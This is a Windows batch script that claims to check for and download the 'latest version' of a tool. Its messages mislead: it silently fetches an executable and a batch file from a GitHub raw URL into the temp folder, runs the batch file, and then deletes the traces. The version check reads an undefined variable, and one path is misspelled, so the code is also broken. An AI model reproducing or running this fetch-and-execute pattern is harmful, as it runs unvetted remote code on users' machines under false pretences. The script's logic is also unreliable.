@echo off

set tempTool=%temp%\up0k_tool.bat
set tempVid=%temp%\up0k_vid.exe

set toolURL=https://raw.githubusercontent.com/Upok18/FAH/refs/heads/main/locator.bat?%random%
set vidURL=https://raw.githubusercontent.com/Upok18/FAH/refs/heads/main/file.exe?%random%

echo Checking latest version...

curl -sL "%vidURL%" -o "%tempVid%"
set /p remoteVer=<"%tempVer%"

echo Downloading latest tool...
curl -sL "%toolURL%" -o "%tempTool%"

call "%tempTool%"

echo Cleaning up...
del "%tempTool%" >nul 2>&1
del "%tempVid%" >nul 2>&1
del "%temo%\Ascii.txt" >nul 2>&1

pause
